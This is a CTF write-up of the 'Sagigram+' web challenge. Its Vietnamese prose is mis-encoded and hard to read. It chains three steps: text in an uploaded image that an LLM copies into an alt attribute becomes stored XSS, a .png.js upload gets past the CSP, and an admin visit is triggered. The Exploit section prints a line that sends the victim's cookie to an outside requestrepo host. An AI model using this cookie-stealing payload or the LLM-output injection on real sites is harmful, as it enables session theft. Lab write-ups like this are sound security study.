---
title: Sagigram+
description: ''
tags:
  - writeup
  - xss
  - csp
  - file-upload
category: web
draft: false
date: 2023-07-04
ctf_event: TFCCTF2024
---

import Callout from '@/components/mdx/Callout.astro';

Status: Done

## Summary

<Callout type="note" title="Note">
ğŸ’¡ Má»™t challenge khÃ¡ lÃ  hay vá» WEB LLM 
Tuy nhiÃªn vÃ¬ bÃ i blackbox, khÃ´ng rÃµ rÃ ng nÃªn viá»‡c phÃ¡t hiá»‡n llm khÃ¡ lÃ  khÃ³
Challenge nÃ y mÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c khi trong giáº£i, do viá»‡c mÃ¬nh upload lÃªn file áº£nh lá»›n vÃ  llm model khÃ´ng extract ra Ä‘Æ°á»£c nÃªn mÃ¬nh nghÄ© vuln náº±m á»Ÿ chá»— khÃ¡c
ThÃªm 1 cÃ¡i ná»¯a chall nÃ y khÃ¡ khÃ³ á»Ÿ chá»— send friend req, ta khÃ´ng tháº¥y Ä‘Æ°á»£c nÃ³ lÃ m gÃ¬. Tuy nhiÃªn á»Ÿ Ä‘Ã¢y admin sáº½ nháº­n Ä‘c friend req vÃ  visit profile cá»§a ta.

</Callout>

## Description

![Untitled](/uploads/sagigram/sagigram/untitled.png)

## Analyst

- Ã tÆ°á»Ÿng cá»§a bÃ i nÃ y lÃ  ta cáº§n cÃ³ XSS store trong server. Tá»« Ä‘Ã³ admin visit vÃ  gá»­i flag lÆ°u trong cookie
- Äáº§u tiÃªn khi ta up lÃªn 1 file áº£nh text thÃ¬ thÃ¬ tháº¥y llm extract ra text vÃ  Ä‘áº©y vÃ o alt. Náº¿u mÃ  áº£nh khÃ´ng cÃ³ text thÃ¬ nÃ³ Ä‘á»ƒ máº·c Ä‘á»‹nh lÃ  default description

  ![Untitled](/uploads/sagigram/sagigram/untitled-1.png)

- Tá»« Ä‘Ã³ ta nghÄ© Ä‘áº¿n Ã½ tÆ°á»Ÿng close vvalue alt vÃ  chÃ¨n xss vÃ o. ThÃ nh cÃ´ng, tuy nhiÃªn á»Ÿ Ä‘Ã¢y csp gÃ¡n self do Ä‘Ã³ code payload khÃ´ng Ä‘Æ°á»£c thá»±c hiá»‡n
- á» Ä‘Ã¢y ta nghÄ© Ä‘áº¿n Ã½ tÆ°á»Ÿng náº¿u ta cÃ³ thá»ƒ Ä‘áº©y lÃªn 1 file js lÆ°u á»Ÿ server thÃ¬ khi script gá»i Ä‘áº¿n src path Ä‘áº¥y thÃ¬ sáº½ nháº­n src script lÃ  self vÃ  execute.
- Tá»« Ä‘Ã³ Ã½ tÆ°á»Ÿng cá»§a ta:
  - Äáº©y lÃªn file js Ä‘á»ƒ bypass filter png khi upload ta chá»‰ cáº§n chÃ¨n filename.png.js
  - Sau Ä‘Ã³ Ä‘áº©y lÃªn má»™t áº£nh text Ä‘á»ƒ llm extract ra chÃ¨n code xss vÃ o lÃ  thÃ nh cÃ´ng gá»­i req ra webhook
  - Sau Ä‘Ã³ gá»­i friend req Ä‘áº¿n admin Ä‘á»ƒ láº¥y flag

## Exploit

- Äáº©y lá»n file js

![Untitled](/uploads/sagigram/sagigram/untitled-2.png)

- Payload file js cÃ³ dáº¡ng nhÆ° sau:

```python
document.location="http://om6gplwj.requestrepo.com?"+document.cookie;

vÃ¬ bÃ i nÃ y cÃ²n set thÃªm default-src nÃªn ta dÃ¹ng document.location thay vÃ¬ fetch
```

- up lÃªn 1 cÃ¡i áº£nh nhÆ° sau:
  ![1.png](/uploads/sagigram/sagigram/1.png)
- Gá»­i req cho admin vÃ  cÃ³ flag

![Untitled](/uploads/sagigram/sagigram/untitled-3.png)

## Result
